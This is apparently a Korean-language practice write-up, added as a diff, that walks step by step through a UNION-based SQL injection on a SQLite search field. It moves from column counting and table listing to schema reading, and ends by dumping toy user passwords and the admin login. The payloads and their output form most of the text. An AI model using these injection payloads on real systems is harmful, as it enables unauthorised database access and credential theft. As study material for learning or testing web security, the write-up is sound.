@@ -1,0 +1,52 @@
+<관리자의 ID와 비밀번호 확인하기 - SQLite>
+
+예상 쿼리문 : select * from members where name like '%_이름_%';
+
+공격 구문: 일%' _공격_ --
+1> 쿼리 개수 파악하기
+order by 5 >> 일%' order by 5 --
+-> 6으로 정렬했을 때 에러가 뜸 (sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 5)
+
+2> 쿼리 위치 파악하기
+union select null,null,null,null,null FROM sqlite_master WHERE type='table' >> 일%' union select 0,1,'c','d',2 FROM sqlite_master WHERE type='table'--
+>> 각 순서대로 위치함 (숫자/문자 상관없이 출력 가능)
+
+공격 구문: 일%' union select _공격_ --
+3> 데이터베이스 파악하기
+null,name,null,null,null from sqlite_master where type='table' >> 일%' union select null,name,null,null,null from sqlite_master where type='table'--
+>> table 이름을 확인했을 때 아래와 같이 나오는 걸 알 수 있다. (개인정보는 profile에 들어있지 않을까 추정)
+이름	점수	지역	취미	나이
+None	member	None	None	None
+None	profile	None	None	None
+None	sqlite_sequence	None	None	None
+멍멍일	77	서울	운동	32
+
+4> 테이블 내 컬럼명 파악하기
+null,sql,null,null,null from sqlite_master where name='member' >> 일%' union select null,sql,null,null,null from sqlite_master where name='member' --
+테이블 내 컬럼 정보를 확인할 수 있다. --> profile이 아니라 member였음!
+[profile]
+이름	점수	지역	취미	나이
+None	CREATE TABLE "profile" ( "name" TEXT, "score" INTEGER, "addr" TEXT, "hobby" TEXT, "age" INTEGER )	None	None	None
+[member]
+이름	점수	지역	취미	나이
+None	CREATE TABLE "member" ( "idx" INTEGER, "id" INTEGER UNIQUE, "name" INTEGER, "password" INTEGER, PRIMARY KEY("idx" AUTOINCREMENT) )	None	None	None
+멍멍일	77	서울	운동	32
+
+5> 관리자 id, 비밀번호 확인하기
+idx,id,name,password,null from member >> 일%' union select idx,id,name,password,null from member --
+
+이름	점수	지역	취미	나이
+1	test01	멍멍일	password01	None
+2	test02	멍멍이	password02	None
+3	test03	멍멍삼	password03	None
+4	test04	멍멍사	password04	None
+5	test05	멍멍오	password05	None
+6	test06	멍멍육	password06	None
+7	test07	멍멍칠	password07	None
+8	test08	멍멍팔	password08	None
+9	test09	멍멍구	password09	None
+10	test10	멍멍십	password10	None
+11	admin	관리자	passw0rd	None
+멍멍일	77	서울	운동	32
+
+확인했을 때 관리자의 id: admin, password: passw0rd
